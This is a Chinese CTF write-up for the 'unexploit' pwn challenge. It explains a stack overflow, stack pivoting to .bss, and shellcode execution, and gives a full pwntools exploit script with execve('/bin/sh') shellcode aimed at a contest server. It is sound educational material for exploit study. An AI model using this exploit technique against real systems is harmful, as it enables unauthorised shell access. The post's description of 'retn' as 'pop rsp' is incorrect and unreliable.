---
layout: post
title: 安恒杯-unexploit
categories: pwn
tags: [pwn]
description: 11
date: 2019-08-05
---

## Checksec unexploit

![img](/assets/images/2019-08-05-unexploit/unexploit2.png)

没开保护，NX没开，第一时间想到的就是写shellcode进去。

## ida分析

![img](/assets/images/2019-08-05-unexploit/unexploit1.png)

有一个栈溢出漏洞，但是只有**0x20**的空间。因此，可以用**栈迁移**。

## 一些汇编指令
```
leave:
    mov rsp,rbp   #将rsp指向rbp
    pop rbp   #将栈中保存的父栈帧的 %rbp 的值赋值给 %rbp，并且 %rsp 上移一个位置指向父栈帧的结尾处。
retn:
    pop rsp   #将当前的ESP中指向的地址出栈，JMP到这个地址。
```
**所以我们可通过覆写rbp来使栈迁移到bss段去，并利用read函数去写入shellcode，再去执行shellcode。**

## 先给出Exp
```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

p = remote('101.71.29.5',10015)
#p = process('./unexploit')

elf = ELF('unexploit')
read_addr = 0x40068A
bss_addr = elf.bss()

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

payload1 = 'a'*8+p64(bss_addr-8)+p64(read_addr)+p64(0xdeadbeef)
payload2 = 'a'*8+p64(bss_addr+8)+p64(read_addr)+p64(0xdeadbeef)   #加上0xdeadbeef是为了填满0x20
payload3 = p64(bss_addr+8)+shellcode

p.send(payload1)
p.send(payload2)
p.send(payload3)
p.interactive()
```
### payload1
    mov rsp,rbp:
                        +-------------+
                        |  aaaaaaaa   |
                        +-------------+  
            rsp、rbp +->+  bss-0x8    |
                        +-------------+
                        |  read_addr  |
                        +-------------+
                        |  0xdeadbeef |
                        +-------------+

    pop rbp:
            +-------------+          +-------------+
            |  aaaaaaaa   |          |             |
            +-------------+          +-------------+
            |  bss-0x8    |    rbp+->+  bss-0x8    |
            +-------------+          +-------------+
      rsp+->+  read_addr  |          |  bss_start  |
            +-------------+          +-------------+
            |  0xdeadbeef |          |             |
            +-------------+          +-------------+

    pop rsp: 返回到read函数。

### payload2   
    mov rsp,rbp
    pop rbp:
                    +-------------+
                    |  aaaaaaaa   |
                    +-------------+
                    |  bss+0x8    |
                    +-------------+
              rsp+->+  read_addr  |<-+bss-start
                    +-------------+
              rbp+->+  0xdeadbeef |
                    +-------------+

    pop rsp:返回到read函数。

### payload3
    mov rsp,pbp
    pop rbp:
            +-------------+
            |  aaaaaaaa   |
            +-------------+
            |  bss+0x8    |
            +-------------+
            |  bss+0x8    |<-+bss-start
            +-------------+
      rsp+->+  shellcode  |
            +-------------+

    pop rsp:执行shellcode



